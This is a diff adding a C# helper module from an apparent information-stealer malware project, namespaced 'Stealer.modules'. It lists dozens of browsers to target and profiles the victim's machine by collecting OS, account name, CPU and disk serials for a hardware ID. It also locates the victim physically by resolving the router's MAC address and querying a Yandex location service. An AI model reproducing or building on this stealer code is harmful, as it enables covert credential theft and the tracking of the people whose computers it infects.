@@ -1,0 +1,201 @@
+﻿using System;
+using System.Management;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Xml;
+using System.IO;
+
+namespace Stealer.modules
+{
+    public class Help
+    {
+        public static string[] BrowsersName = new string[]
+        {
+                "Chrome",
+                "Edge",
+				"Chromium",
+                "Yandex",
+                "Orbitum",
+				"Atom",
+				"Kometa",
+                "Opera",
+				"Brave-Browser",
+                "Amigo",
+                "Torch",
+                "Comodo",
+                "CentBrowser",
+                "uCozMedia",
+				"Chromodo",
+                "Rockmelt",
+                "Sleipnir",
+				"Slimjet",
+				"360Browser",
+                "SRWare Iron",
+                "Vivaldi",
+                "Sputnik",
+				"Nichrome",
+				"CocCoc",
+                "Maxthon",
+				"K-Melon",
+                "AcWebBrowser",
+                "Epic Privacy Browser",
+                "Maple Studio",
+                "Black Hawk",
+                "Flock",
+                "CoolNovo",
+                "Baidu Spark",
+                "Titan Browser",
+                "Google",
+                "browser"
+        };
+		public static string Windows()
+		{
+			foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
+			{
+				try
+				{
+					return ((string) managementObject["Caption"]).Trim() + "(" + (string) managementObject["OSArchitecture"] + ")";
+				}
+				catch { }
+			}
+			return "Unknown";
+		}
+		public static string GetTime()
+		{
+			try
+			{
+				return DateTime.Now.ToString();
+			}
+			catch { }
+			return "Unknown";
+		}
+		public static string AccountName()
+		{
+		  foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_UserAccount").Get())
+		  {
+			try
+			{
+			  return managementObject.GetPropertyValue("Name").ToString();
+			}
+			catch
+			{
+			}
+		  }
+		  return "Unknown";
+		}
+		
+		public static string LocationFind()
+		{
+			string LatitudeAndLongitude = string.Empty;
+			try
+			{
+				string mac = viewResult();
+				LatitudeAndLongitude = FindFromMac(mac);
+			}
+			catch { }
+			return LatitudeAndLongitude;
+		}
+		
+		private static string viewResult()
+        {
+            string result = string.Empty;
+            try
+            {
+                ManagementObjectSearcher NetworkSearcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration");
+                foreach (ManagementObject NetworkObj in NetworkSearcher.Get())
+                {
+                    string[] router = (string[])(NetworkObj["DefaultIPGateway"]);
+                    if (router != null)
+                    {
+                        result = ConvertIpToMAC(IPAddress.Parse(router[0]));
+                    }
+                }
+            }
+            catch { }
+            return result;
+        }
+		
+		private static IPAddress DoGetHostAddresses(string hostname)
+        {
+            IPAddress[] ips;
+            ips = Dns.GetHostAddresses(hostname);
+            return ips[0];
+        }
+		
+		[DllImport("iphlpapi.dll", ExactSpelling = true)]
+        private static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);
+        private static string ConvertIpToMAC(IPAddress ip)
+        {
+            byte[] ab = new byte[6];
+            int len = ab.Length;
+            int r = SendARP(ip.GetHashCode(), 0, ab, ref len);
+            return BitConverter.ToString(ab, 0, 6);
+        }
+		
+		private static string FindFromMac(string mac_addr)
+        {
+			string res = string.Empty;
+            try
+            {
+                string bss = mac_addr.Replace("-", "");
+                string Out = Th(bss);
+                XmlDocument xmlDocument = new XmlDocument();
+                xmlDocument.LoadXml(Out);
+                foreach (XmlNode xmlNode in (XmlNode)xmlDocument.DocumentElement)
+                {
+                    if (xmlNode.Attributes.Count > 0)
+                    {
+						res = "https://www.google.ru/maps/search/" + xmlNode.Attributes.GetNamedItem("latitude").Value + " " + xmlNode.Attributes.GetNamedItem("longitude").Value;
+                    }
+                }
+            }
+            catch { }
+			return res;
+        }
+		
+		private static string Th(string bssid)
+        {
+            string Out = string.Empty;
+            try
+            {
+                StreamReader streamReader = new StreamReader(WebRequest.Create("http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks=" + bssid + ":-65&app=ymetro ").GetResponse().GetResponseStream());
+                Out = streamReader.ReadToEnd();
+                streamReader.Close();
+            }
+            catch { }
+            return Out;
+        }
+		
+		public static string HWID = GetProcessorID() + GetHwid();
+		
+		private static string GetHwid() 
+        {
+            string hwid = "";
+            try
+            {
+                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
+                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
+                disk.Get();
+                string diskLetter = (disk["VolumeSerialNumber"].ToString());
+                hwid = diskLetter;
+            }
+            catch
+            { }
+            return hwid;
+        }
+		
+		private static string GetProcessorID()
+        {
+            string sProcessorID = "";
+            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
+            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
+            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
+            foreach (ManagementObject oManagementObject in oCollection)
+            {
+                sProcessorID = (string)oManagementObject["ProcessorId"];
+            }
+
+            return (sProcessorID);
+        }
+    }
+}
